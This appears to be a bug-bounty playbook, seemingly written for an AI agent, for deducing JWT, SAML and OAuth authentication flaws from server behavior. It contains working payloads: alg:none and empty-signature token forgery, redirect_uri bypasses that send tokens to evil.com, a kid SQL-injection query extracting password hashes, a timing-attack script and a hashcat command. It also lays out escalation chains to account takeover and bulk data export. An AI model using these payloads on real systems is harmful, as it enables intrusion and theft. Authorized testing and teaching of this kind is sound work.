# Behavioral Reasoning Framework — Auth Attack Deduction

This reference teaches you to work *backwards* from observable server behavior to what the
implementation must look like internally. The top 0.1% of hunters don't try all 20 attacks
in order — they observe two or three server responses and immediately know which three attacks
are worth trying. This is that mental model.

---

## Part 1: Deduce the JWT Library From Behavior

You don't need to know the stack upfront. You can fingerprint the JWT library from how it
responds to malformed inputs. Send one probe, read the response, eliminate 80% of attack space.

### Probe 1: Send alg:none

```
Authorization: Bearer <base64url({"alg":"none","typ":"JWT"})>.<original_payload>.
```

| Response | Deduction |
|----------|-----------|
| `200 OK` | Library doesn't enforce algorithm — **exploit immediately** |
| `"algorithm not supported"` | Explicit allowlist in code. Try capitalization variants (`None`, `NONE`). May still work. |
| `"invalid algorithm"` | Similar — strict check, but check all variants |
| `"invalid signature"` | alg:none blocked correctly. Pivot to RS256→HS256 or kid |
| `500 Internal Server Error` | Parsing error — the library crashed. Send malformed variants to map parser behavior |
| Stack trace | **Library and version revealed.** Search CVEs immediately |
| Request times out | Server is trying to fetch something (possibly jku/x5u processing without validation) |

### Probe 2: Send malformed alg field

```json
{"alg": null, "typ": "JWT"}
{"alg": 12345, "typ": "JWT"}
{"alg": ["RS256"], "typ": "JWT"}
```

| Response | Deduction |
|----------|-----------|
| `200` on any of these | Type coercion bug — library treats non-string alg permissively |
| Different error for each | Error messages may contain library name |
| `"alg must be a string"` | Library has explicit type checking (likely newer, secure) |

### Probe 3: Send empty signature

```
<valid_header>.<modified_payload>.
```
(trailing dot, no signature)

| Response | Deduction |
|----------|-----------|
| `200` | Critical — library treats empty sig as valid |
| `"invalid signature length"` | Signature length validated before HMAC comparison |
| `"signature verification failed"` | Verification runs but fails — normal |

### Probe 4: Malformed header (oversized, weird encoding)

```
Authorization: Bearer notajwt
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.  (no payload)
```

| Response | Deduction |
|----------|-----------|
| Library name in error | Look up its CVEs — you now know exactly what you're attacking |
| Generic "unauthorized" | Library swallows errors. Still try all variants. |
| Different HTTP status codes | 401 vs 400 vs 422 reveal different validation paths |

---

## Part 2: Deduce the SAML Parser From Behavior

### Probe 1: Send valid SAMLResponse, then modified version

Take a captured valid SAMLResponse and make minimal changes, one at a time:

1. Change the NameID value → does auth fail? (Good — means binding is checked)
2. Change the Issuer element → does auth fail? (Good — Issuer validated)
3. Add an extra XML namespace declaration → does auth fail? (If not — namespace confusion possible)
4. Wrap the valid element in a new outer element → does auth fail? (If not — XSW possible)

### Probe 2: InResponseTo behavior

```xml
<Response InResponseTo="FAKE_REQUEST_ID">
```

| Response | Deduction |
|----------|-----------|
| Auth succeeds | InResponseTo not validated → SP-initiated flow forgeable |
| Auth fails with "InResponseTo mismatch" | Validated. But try with the real request ID from a previous flow. |
| Auth fails with different error | Parse error in validation code — dig deeper |

### Probe 3: Namespace manipulation

```xml
<!-- Original -->
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">

<!-- Try adding a second namespace binding for the same prefix -->
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
```

If the parser doesn't reject this → it may be vulnerable to canonicalization desync (The Fragile Lock attack in saml-attacks.md Section 8).

---

## Part 3: Deduce Redirect URI Validation Logic

You can't see the server's regex, but you can reverse-engineer it from behavior.

### Step 1: Map the exact registered URI

```
https://app.example.com/auth/callback
```

### Step 2: Test suffix permissiveness

```
https://app.example.com/auth/callback/extra       → pass? → path not anchored
https://app.example.com/auth/callbackX             → pass? → not anchored even at boundary
https://app.example.com/auth/callback?foo=bar      → pass? → query string allowed
```

### Step 3: Deduce regex from results

| What passes | What the regex likely is | What to try next |
|-------------|--------------------------|-----------------|
| Only exact match | Strict equality check | Domain not checked? Try encoded slash |
| Any path under /auth/ | `startsWith` check | Open redirect in /auth/ path space |
| Any subdomain | Wildcard on domain | Register subdomain, do CNAME to you |
| Encoded variants | URL decoded before check | Try double-encoding |

### Step 4: Parser differential (most powerful)

Browsers and servers parse URLs differently. These discrepancies create bypasses:

```
https://legit.com\@evil.com/callback    → Browser: navigates to evil.com
                                          Many servers: sees legit.com as host

https://evil.com#legit.com/callback     → Fragment not sent to server
                                          Server validates legit.com
                                          Browser delivers token to evil.com context

https://legit.com%2F.evil.com/callback  → %2F decoded to / or not, depending on library
```

---

## Part 4: Deduce What Claims Are Actually Checked

Once you have signing capability, don't guess — probe systematically.

```python
# Strategy: binary search the claims
# Start with minimal changes, expand

# Probe 1: Change only 'role'
{"sub": "user_123", "role": "admin", "exp": 9999999999}

# If that gets you more access: document it, then try sub
# If not: maybe role is ignored — try sub

# Probe 2: Change only 'sub'
{"sub": "1", "role": "user", "exp": 9999999999}

# Probe 3: Combination
{"sub": "1", "role": "admin", "exp": 9999999999}
```

This tells you:
- Which claims are checked for authorization (vs ignored)
- Which claim controls which feature (role-based vs id-based access)
- Whether there are hidden claims (add `admin: true`, `tier: enterprise`, `staff: true`)

---

## Part 5: Source Code Pattern Recognition

When you have access to the target's source code (open-source, GitHub, exposed repo):

### JWT — What to grep for

```bash
# Find JWT verification code
grep -r "verify\|decode\|jwt\|token" --include="*.js" -l
grep -r "algorithms\|algorithm\|alg" --include="*.js"

# Red flags in Node.js (jsonwebtoken)
grep -r "algorithms: \[" .  # Should be ['RS256'] or similar — if missing → alg:none possible
grep -r "ignoreExpiration" .  # If true → expired tokens accepted
grep -r "verify_signature.*False\|options.*verify_signature" .  # Python: sig skip

# Red flags in Python (PyJWT)
grep -r "options=" .
grep -r "verify_signature\|verify_exp\|verify_aud" .

# Red flags in Java
grep -r "setAllowedAlgorithms\|without\|insecure" .
```

### SAML — What to grep for

```bash
# ruby-saml patterns
grep -r "validate_response\|validate_signature" .
grep -r "soft\s*=\s*true" .  # Soft mode = errors ignored = bypass possible

# XML parsing
grep -r "nokogiri\|rexml\|libxml" .
# If both nokogiri AND rexml appear → parser differential (CVE-2025-25291/92 pattern)

# XPath selectors
grep -r "xpath\|//saml\|//ds:" .
grep -r "\"//" .  # Double slash XPath = unrestricted traversal
```

### OAuth redirect_uri — What to grep for

```bash
# The validation logic
grep -r "redirect_uri\|redirectUri\|redirect_url" . --include="*.py" -A 3
grep -r "startsWith\|contains\|match\|test(" . --include="*.js" -A 2

# Red flags
grep -r "startsWith.*redirect" .     # Only checks prefix — path suffix bypass works
grep -r "includes.*redirect" .       # Substring check — bypass with subdomain
grep -r "redirect.*split.*/" .       # Splits on / — what happens with URL encoding?
```

---

## Part 6: Cross-Skill Escalation Chains

An auth bypass without data impact is a Medium. With the right chain it becomes a Critical.

### Chain 1: JWT Signature Bypass → Account Takeover

```
1. Find JWT forgery (any technique)
2. Set sub = target_user_id (get IDs from:
   - /api/users/search response
   - GraphQL introspection
   - Your own profile (your ID = N, admin = 1)
3. Make authenticated request as victim
4. Invoke data-exfil-deep to enumerate what sensitive data is now accessible
5. Report: "JWT bypass allows complete account takeover for all N users,
   exposing [T1 data] including SSN/payment data/medical records"
```

### Chain 2: OAuth CSRF Login → Session Hijack

```
1. Find missing state parameter validation
2. Create exploit: victim visits your page → silently logged into your account
3. If your account has payment method saved → victim's new purchases billed to you
4. If victim logs in and you're still linked → persistent access
5. Severity: Medium alone → Critical if you demonstrate financial impact
```

### Chain 3: SAML Assertion Manipulation → Admin Access

```
1. Find SAMLResponse manipulation (XSW, comment injection, or replay)
2. Elevate to admin role by changing assertion attributes
3. As admin: enumerate all users, export all data
4. Invoke data-exfil-deep to determine scale
5. Report: "SAML bypass grants admin access to all [N] user records"
```

### Chain 4: JWT kid SQLi → Database Read

```
1. Confirm kid SQL injection works (200 response with injected key)
2. Prove the injection by exfiltrating data through the key field:
   kid = "' UNION SELECT password_hash FROM users LIMIT 1--"
   (Sign token with the returned hash as the HMAC secret)
3. This proves SQL injection — escalate to full DB access report
4. Chain with data-exfil-deep for mass exposure impact
```

### Chain 5: Token Leakage in Referer → Account Takeover

```
1. Find token in Referer header going to external resource
2. Set up listening post (webhook.site, requestbin, etc.)
3. Demonstrate: craft a page that includes an image from your listener,
   victim visits the page while logged in → token appears in your logs
4. Replay token → authenticated as victim
5. Follow chain 1 from here
```

---

## Part 7: Timing Attacks on HMAC JWT Validation

Many JWT libraries use non-constant-time HMAC comparison, leaking one byte at a time via
timing differences. This is a last-resort technique but it's real and has been found in prod.

### When to try it

- You know the algorithm is HS256/HS384/HS512
- You've exhausted wordlist attacks
- The application is fast and stable (consistent response times)
- You have a high-quality timing measurement setup

### Theory

HMAC comparison: `expected == received`

If implemented with Python `==` or C `strcmp` (not `hmac.compare_digest` / `crypto.timingSafeEqual`):
- Comparison stops at the first differing byte
- Tokens where byte 0 matches take slightly longer than tokens where byte 0 doesn't
- Repeat for each position → recover full HMAC → recover secret (if invertible) or forge directly

### Practical check (is it vulnerable?)

```python
import time, requests, statistics

base_token = "eyJ..."  # Your real token
target_url = "https://target.com/api/protected"
headers = {"Authorization": f"Bearer {base_token}"}

# Baseline timing with valid token
times_valid = []
for _ in range(50):
    start = time.perf_counter()
    requests.get(target_url, headers=headers)
    times_valid.append(time.perf_counter() - start)

# Timing with completely wrong sig (all zeros)
wrong_sig = base_token.rsplit('.', 1)[0] + '.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
times_wrong = []
for _ in range(50):
    start = time.perf_counter()
    requests.get(target_url, headers={"Authorization": f"Bearer {wrong_sig}"})
    times_wrong.append(time.perf_counter() - start)

delta_ms = (statistics.mean(times_valid) - statistics.mean(times_wrong)) * 1000
print(f"Mean delta: {delta_ms:.2f}ms")
print(f"Stddev valid: {statistics.stdev(times_valid)*1000:.2f}ms")
# If delta > 3x stddev: timing difference is real → library may be vulnerable
```

### Tools for serious timing attacks

- **timing-attack gem (Ruby)**: `gem install timing-attack`
- **timeit.py**: Custom tool for HTTP timing attacks
- **wrk with Lua**: High-precision HTTP timing measurement
- Network: Do this from a co-located host — WAN jitter will drown out the signal

---

## Quick Decision Tree (Use This First)

```
START: Have a JWT token
│
├─ Try alg:none → 200?
│   └─ YES: Critical. Forge admin token, document.
│
├─ Try alg:none → 401 "algorithm not allowed"?
│   └─ Try None/NONE/nOnE variants → any 200?
│       └─ YES: Critical.
│
├─ JWKS endpoint exists?
│   ├─ YES: Try RS256→HS256 with public key as HMAC secret
│   └─ Try jku injection pointing to your JWKS server
│
├─ kid field in header?
│   ├─ Try path traversal: ../../dev/null
│   └─ Try SQL injection variants
│
├─ HS256/HS384/HS512?
│   └─ Brute force: hashcat -a 0 -m 16500 <token> rockyou.txt
│
└─ None of the above:
    Check CVEs for identified library version
    Try timing attack
    Move to session attacks (Phase 5)
```
